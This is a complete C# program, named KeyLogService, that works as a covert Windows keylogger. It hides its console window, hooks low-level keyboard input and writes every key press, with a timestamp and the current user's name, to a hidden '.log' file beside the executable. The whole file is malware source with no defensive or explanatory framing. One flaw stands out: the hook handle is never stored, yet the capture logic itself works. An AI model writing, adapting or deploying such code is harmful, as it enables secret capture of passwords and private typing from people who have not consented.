using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogService
{
    class Program
    {
        private const int SW_HIDE = 0;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static IntPtr _hookID = IntPtr.Zero;
        private static readonly string Path = Application.StartupPath + @"\.log";

        static void Main(string[] args)
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, LoadLibrary("user32.dll"), 0);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                using (StreamWriter writer = new StreamWriter(Path, true))
                {
                    writer.Write(DateTime.Now.ToShortDateString());
                    writer.Write(" ");
                    writer.Write(DateTime.Now.ToLongTimeString());
                    writer.Write(" ");
                    writer.Write(Environment.UserName);
                    writer.Write(" ");
                    writer.WriteLine((Keys)Marshal.ReadInt32(lParam));
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dll);

    }
}
